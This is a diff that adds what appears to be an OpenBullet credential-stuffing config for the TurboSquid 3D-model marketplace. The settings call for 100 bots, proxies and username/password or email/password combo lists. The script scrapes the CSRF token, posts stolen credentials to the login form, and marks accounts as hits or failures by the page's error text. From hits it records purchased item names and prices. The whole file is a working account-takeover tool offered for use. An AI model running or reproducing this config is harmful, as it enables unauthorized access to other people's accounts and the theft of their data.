@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Turbosquid",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-14T14:52:47.5020687+00:00",
+  "AdditionalInfo": "Great for 3D artists and game developers",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.turbosquid.com/Login/Index.cfm" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "name=\"csrf\" id=\"csrf\" value=\"" "\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://www.turbosquid.com/Login/Index.cfm" AutoRedirect=TRUE 
+  CONTENT "LoginUsername=<USER>&LoginPassword=<PASS>&LoginRemember=1&Action=Login&stgRU=https://www.turbosquid.com/Order/Index.cfm&Clnt=1&csrf=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.turbosquid.com/Order/Index.cfm" 
+  HEADER "origin: https://www.turbosquid.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "rong Password or Member Name" 
+    KEY "Wrong password" 
+  KEYCHAIN Success OR 
+    KEY ">Order History<" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "<div class=\"ItemName\">" 
+  KEYCHAIN Success OR 
+    KEY "<div class=\"ItemName\">" 
+#CAPTURE_ITEM_NAME PARSE "<SOURCE>" LR "<div class=\"ItemName\">
+						<p >" "<" Recursive=TRUE -> CAP "Name" "" "" 
+#CAPTURE_ITEM_PRICE PARSE "<SOURCE>" LR "<span class=\"RegularProductPrice\">" "<" Recursive=TRUE -> CAP "Price" "" "" 
